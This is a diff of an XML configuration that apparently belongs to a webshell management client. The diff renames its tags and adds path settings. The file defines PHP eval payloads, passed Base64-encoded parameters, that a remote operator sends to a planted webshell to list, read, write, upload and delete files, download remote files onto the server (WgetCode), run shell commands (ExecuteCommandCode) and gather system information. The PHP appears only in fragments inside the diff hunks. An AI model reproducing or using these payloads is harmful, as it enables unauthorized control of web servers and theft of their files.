@@ -1,9 +1,10 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
-<CustomShellType>
-  <FuncCodeSetting>
-    <Func>
+<customShellType>
+  <funcCodeSetting>
+    <func>
       <name>WwwRootPathCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
@@ -21,10 +22,11 @@ else $R.="/";
 print $R;
 echo("|<-");
 die();]]></item>	  
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>FileTreeCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
@@ -53,10 +55,11 @@ else {
 }
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>ReadFileCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
@@ -68,10 +71,11 @@ echo(@fread($P,filesize($F)));
 @fclose($P);
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>WriteFileCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -83,10 +87,11 @@ $buf=base64_decode($_POST["$fileContext$"]);
 echo @fwrite(fopen($f,"w"),$buf)?"1":"0";
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>DeleteFileOrDirCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
@@ -116,10 +121,11 @@ echo(file_exists($F)?@unlink($F)?"1":"0":"0");
 };
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>DownloadFileCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
@@ -138,10 +144,11 @@ else
 }
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>UploadFileCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -157,10 +164,11 @@ for ($i=0; $i<strlen($c); $i+=2)$buf.=urldecode("%".substr($c,$i,2));
 echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>CopyFileOrDirCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -202,10 +210,11 @@ $fp=base64_decode($_POST["$targetFilePath$"]);
 echo(xcopy($fc,$fp)?"1":"0");
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>RenameFileOrDirCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -217,10 +226,11 @@ $dst=base64_decode($_POST["$newName$"]);
 echo(rename($src,$dst)?"1":"0");
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>CreateDirCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
@@ -230,10 +240,11 @@ $f=base64_decode($_POST["$dirPath$"]);
 echo(mkdir($f)?"1":"0");
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>ModifyFileOrDirTimeCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -252,10 +263,11 @@ else
 }
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>WgetCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/FileManager</path>
 	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -280,10 +292,11 @@ else
 }
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>ExecuteCommandCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/Cmder</path>
 	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
 	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
       <item><![CDATA[@ini_set("display_errors","0");
@@ -299,10 +312,11 @@ $r="{$p} {$c}";
 print ($ret!=0)?"ret={$ret}":"";
 echo("|<-");
 die();]]></item>
-    </Func>
-    <Func>
+    </func>
+    <func>
       <name>SysInfoCode</name>
 	  <type>phpEval,phpEval_Cookie</type>
+	  <path>/Cmder</path>
       <item><![CDATA[@ini_set("display_errors","0");
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
@@ -315,6 +329,6 @@ $r.=DIRECTORY_SEPARATOR;
 print $r;
 echo("|<-");
 die();]]></item>
-    </Func>
-  </FuncCodeSetting>
-</CustomShellType>
+    </func>
+  </funcCodeSetting>
+</customShellType>
